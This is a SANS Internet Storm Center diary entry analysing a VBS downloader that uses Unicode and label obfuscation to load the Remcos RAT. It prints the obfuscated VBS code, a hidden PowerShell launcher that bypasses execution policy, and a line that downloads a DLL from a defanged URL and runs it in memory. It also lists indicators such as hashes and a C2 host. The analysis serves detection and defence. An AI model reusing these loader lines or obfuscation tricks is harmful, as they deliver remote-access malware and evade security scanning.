---
title: Remcos Downloader with Unicode Obfuscation, (Fri, Nov 4th)
url: https://isc.sans.edu/diary/rss/29220
source: SANS Internet Storm Center, InfoCON: green
date: 2022-11-05
fetch_date: 2025-10-03T21:47:32.872429
---

# Remcos Downloader with Unicode Obfuscation, (Fri, Nov 4th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29214)
* [next](/diary/29222)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Remcos Downloader with Unicode Obfuscation](/forums/diary/Remcos%2BDownloader%2Bwith%2BUnicode%2BObfuscation/29220/)

**Published**: 2022-11-04. **Last Updated**: 2022-11-04 07:08:23 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Remcos%2BDownloader%2Bwith%2BUnicode%2BObfuscation/29220/#comments)

I spotted a malicious RAR archive that contained a VBS script. It was called “Unidad judicial citacion pendiente Fiscalia.rar” and protected with a simple 4-numbers password to defeat automatic scanning. Inside, the VBS script has the same name. Both are unknown to VT.

The file has stupid (but still effective) tricks to pollute the code like comments (lines starting with a single quote) and labels (lines ending with a colon). Note that you can join multiple label in one line:

```

IzGPO:yWNxx:IOfaI:Cvghz:qfPU:aDHqa:LxWPC:ULLtt:YwPsT
```

The VBS script deobfuscate some code and launches a PowerShell interpreter. Main data is Base64-encoded but unicode characters are injected:

![](https://isc.sans.edu/diaryimages/images/isc-20221104-1.png)

Here again, very simple but unicode characters are not properly handled by many tools, especially on Linux. If you try to display the script about in a Linux shell, you won’t see interesting code!

Suspicious functions are obfuscated and called through other ones. The script has multiple reserved strings. "StrReverse" is ofbuscated like this:

```

Function BgkX(GGMtp)
  dim MDje
  MDje = "BgkX = "
  MDje = MDje + "SNdPZOtrNdPZORevNdPZOerse"
  MDje = BeWD(MDje,"NdPZO","")
  MDje = MDje + "(GGMtp)"
  execute(MDje)
End Function
```

The execute() statement is like eval() in Javascript, it takes a string argument and interprets it as a VBS statement or sequence of statements

Another obfuscation:

![](https://isc.sans.edu/diaryimages/images/isc-20221104-2.png)

Here is the executed PowerShell script (beautified):

```

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command \
$iUqm = 'JABSAG8AZABhAEMAbwBwAHkAI (payload removed) AA9ACAAJwA???ASwBhAGIAJwAgACkAKQA='; \
$OWjuxD = [system.Text.Encoding]::Unicode.GetString( [system.Convert]::FromBase64String( $iUqm.replace('???','U') ) ); \
$OWjuxD = $OWjuxD.replace('??????????', 'C:\Users\user01\AppData\Local\Temp\Unidad judicial cita.vbs'); \
powershell.exe -windowstyle hidden -ExecutionPolicy Bypss -NoProfile -Command $OWjuxD
```

The next decoded Base64 payload (also polluted with junk characters) is:

```

$RodaCopy = '–¯¯––¯––¯¯'; [Byte[]] $DLL = [system.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('hxxps://tinyurl[.]com/2erph6cs'));[system.AppDomain]::CurrentDomain.Load($DLL).GetType('NwgoxM.KPJaNj').GetMethod('PUlGKA').Invoke($null, [object[]] ('0/Ev3d1/d/ee.etsap//:sptth' , $RodaCopy , 'd3vEKab' ))
```

A DLL is downloaded from hxxps://tinyurl[.]com/2erph6cs (SHA255:49562fda46cfa05b2a6e2cb06a5d25711c9a435b578a7ec375f928aae9c08ff2). It is already on VT with a score of 40/69[[1](https://www.virustotal.com/gui/file/49562fda46cfa05b2a6e2cb06a5d25711c9a435b578a7ec375f928aae9c08ff2/details)]. The DLL is loaded in the currentprocess using the AppDomain.Load method[[2](https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-6.0)] and launch a Remcos sample (SHA256:ee1e6615088a95b6d401603fc0f46b105a453eecbd8131305443983b6d32151f[[3](https://www.virustotal.com/gui/file/ee1e6615088a95b6d401603fc0f46b105a453eecbd8131305443983b6d32151f)]) from the reversed URL.

The C2 server is defenderos2.con-ip[.]com:2425.

I've already seen this infection technique a few months ago but it seems it remains effective and is still in the wild. Many security controls, especially running on Linux, have issues to properly handle Unicide characters!

[1] <https://www.virustotal.com/gui/file/49562fda46cfa05b2a6e2cb06a5d25711c9a435b578a7ec375f928aae9c08ff2/details>
[2] <https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-6.0>
[3] <https://www.virustotal.com/gui/file/ee1e6615088a95b6d401603fc0f46b105a453eecbd8131305443983b6d32151f>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [DLL](/tag.html?tag=DLL) [Unicode](/tag.html?tag=Unicode) [Downloader](/tag.html?tag=Downloader) [Malware](/tag.html?tag=Malware) [Obfuscation](/tag.html?tag=Obfuscation) [VBScript](/tag.html?tag=VBScript) [Remcos](/tag.html?tag=Remcos)

[0 comment(s)](/diary/Remcos%2BDownloader%2Bwith%2BUnicode%2BObfuscation/29220/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/29214)
* [next](/diary/29222)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)